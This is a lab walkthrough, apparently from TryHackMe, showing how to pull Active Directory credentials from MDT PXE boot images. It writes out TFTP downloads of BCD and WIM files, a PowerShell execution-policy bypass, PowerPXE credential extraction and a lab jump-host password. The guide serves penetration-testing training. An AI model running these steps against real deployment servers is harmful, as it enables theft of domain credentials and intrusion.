# Microsoft Deployment Toolkit (MDT) & SCCM: Breaching Active Directory

Large organisations require tools to efficiently deploy and manage their IT infrastructure. Manual installation of software on every machine is impractical at scale. Microsoft provides tools like MDT and SCCM to centrally manage these tasks—but misconfigurations can be exploited to breach Active Directory (AD).

---

## MDT and SCCM Overview

- **Microsoft Deployment Toolkit (MDT):** Automates deployment of Microsoft Operating Systems (OS). Enables IT teams to maintain and update base images centrally, streamlining new machine setup.
- **System Center Configuration Manager (SCCM):** Manages updates for Microsoft applications, services, and OS. SCCM handles patch management, allowing updates to be tested and deployed centrally.

**Integration:**  
MDT is often integrated with SCCM. MDT handles new deployments and image management, while SCCM manages ongoing updates and patching.

**Security Note:**  
Central management tools like MDT and SCCM are attractive targets for attackers. Misconfigurations can allow attackers to compromise large portions of the infrastructure.

---

## PXE Boot

**Preboot Execution Environment (PXE) boot** allows new devices to install the OS directly over the network. MDT can create, manage, and host PXE boot images, typically integrated with DHCP. When a device receives an IP lease from DHCP, it can request the PXE boot image and begin OS installation.

**Attack Vectors:**
- Injecting a privilege escalation vector (e.g., a local administrator account).
- Performing password scraping attacks to recover AD credentials used during installation.

This guide focuses on password scraping to recover the deployment service account credentials used by MDT.

---

## PXE Boot Image Retrieval

### Step 1: Gather Information

- **MDT Server IP:** Obtain via DHCP or from the network diagram.
- **BCD Files:** These files store PXE boot configuration for different architectures. Retrieve them from [http://pxeboot.za.tryhackme.com](http://pxeboot.za.tryhackme.com).

> **Note:** BCD filenames are regenerated daily. Replace `x64{7B...B3}.bcd` with your specific filename.

---

### Step 2: SSH into the Jump Host

```shell
ssh thm@THMJMP1.za.tryhackme.com
# Password: Password1@
```

Create a working directory and copy the `powerpxe` repository:

```shell
cd Documents
mkdir <username>
copy C:\powerpxe <username>\
cd <username>
```

---

### Step 3: Download the BCD File via TFTP

Use TFTP to download the BCD file from the MDT server:

```shell
tftp -i <THMMDT IP> GET "\Tmp\x64{...}.bcd" conf.bcd
```

- Lookup the MDT server IP with:
    ```shell
    nslookup thmmdt.za.tryhackme.com
    ```

---

### Step 4: Extract PXE Boot Image Location

Use PowerShell and `powerpxe` to parse the BCD file:

```powershell
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
# Output will show the PXE Boot Image Location
```

---

### Step 5: Download the PXE Boot Image

```shell
tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
```

> **Note:** Downloading the WIM file may take several minutes.

---

## Recovering Credentials from the PXE Boot Image

You can extract credentials from the PXE boot image using `powerpxe` or manually by searching for the `bootstrap.ini` file inside the image.

**Using powerpxe:**

```powershell
Get-FindCredentials -WimFile pxeboot.wim
```

**Sample Output:**
```
>>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> UserID = <account>
>>>> UserDomain = ZA
>>>> UserPassword = <password>
```

---

## Summary

By exploiting misconfigurations in MDT and PXE boot processes, attackers can retrieve AD credentials and potentially compromise the domain. Always secure deployment infrastructure and monitor for unauthorized access.
